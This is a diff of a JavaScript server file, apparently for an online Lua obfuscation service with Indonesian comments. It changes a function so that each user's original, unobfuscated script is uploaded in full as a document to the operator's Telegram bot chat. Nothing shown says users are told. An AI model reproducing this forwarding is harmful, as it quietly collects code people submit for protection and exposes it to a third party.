@@ -54,25 +54,57 @@ function sendTelegram(text) {
     req.end();
 }
 
-// ─── FUNGSI KIRIM FILE SCRIPT KE TELEGRAM ───────────────────
+// ─── FUNGSI KIRIM FILE SCRIPT KE TELEGRAM (SEBAGAI DOKUMEN) ───
 function sendTelegramFile(scriptContent, scriptId) {
-    // Potong jika terlalu panjang (Telegram max 4096 char per pesan)
-    const preview = scriptContent.length > 3500
-        ? scriptContent.slice(0, 3500) + '\n\n... [TRUNCATED]'
-        : scriptContent;
+    // Membuat nama file unik berdasarkan ID
+    const filename = `script_${scriptId}.lua`;
+    
+    // Pesan (caption) yang akan menyertai file
+    const caption = `🔔 <b>Script Baru Diobfuskasi!</b>\n🆔 <b>Script ID:</b> <code>${scriptId}</code>\n📏 <b>Panjang:</b> ${scriptContent.length} karakter\n🕐 <b>Waktu:</b> ${new Date().toISOString().replace('T',' ').slice(0,19)} UTC`;
 
-    const msg =
-`🔔 <b>Script Baru Diobfuskasi!</b>
+    // Membuat boundary (pembatas) unik untuk format multipart/form-data
+    const boundary = '----TelegramBoundary' + Date.now().toString(16);
 
-🆔 <b>Script ID:</b> <code>${scriptId}</code>
-📏 <b>Panjang:</b> ${scriptContent.length} karakter
-🕐 <b>Waktu:</b> ${new Date().toISOString().replace('T',' ').slice(0,19)} UTC
+    // Menyusun payload (isi) request multipart
+    let payload = `--${boundary}\r\n`;
+    payload += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
+    payload += `${TELEGRAM_CHAT_ID}\r\n`;
 
-📄 <b>Isi Script Original:</b>
-<pre>${preview.replace(/</g,'&lt;').replace(/>/g,'&gt;')}</pre>`;
+    payload += `--${boundary}\r\n`;
+    payload += `Content-Disposition: form-data; name="caption"\r\n\r\n`;
+    payload += `${caption}\r\n`;
 
-    sendTelegram(msg);
+    payload += `--${boundary}\r\n`;
+    payload += `Content-Disposition: form-data; name="parse_mode"\r\n\r\n`;
+    payload += `HTML\r\n`;
 
+    payload += `--${boundary}\r\n`;
+    // Menambahkan ekstensi file agar terdeteksi sebagai dokumen di Telegram
+    payload += `Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`;
+    payload += `Content-Type: text/plain\r\n\r\n`;
+    payload += `${scriptContent}\r\n`;
+    
+    payload += `--${boundary}--\r\n`;
+
+    const options = {
+        hostname: 'api.telegram.org',
+        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
+        method: 'POST',
+        headers: {
+            'Content-Type': `multipart/form-data; boundary=${boundary}`,
+            'Content-Length': Buffer.byteLength(payload)
+        }
+    };
+
+    const req = https.request(options, (res) => {
+        let data = '';
+        res.on('data', chunk => data += chunk);
+        res.on('end', () => console.log('[TELEGRAM DOC]', data));
+    });
+    
+    req.on('error', err => console.error('[TELEGRAM DOC ERROR]', err));
+    req.write(payload);
+    req.end();
 }
 
 // ─── FUNGSI OBFUSKASI PROMETHEUS ────────────────────────────
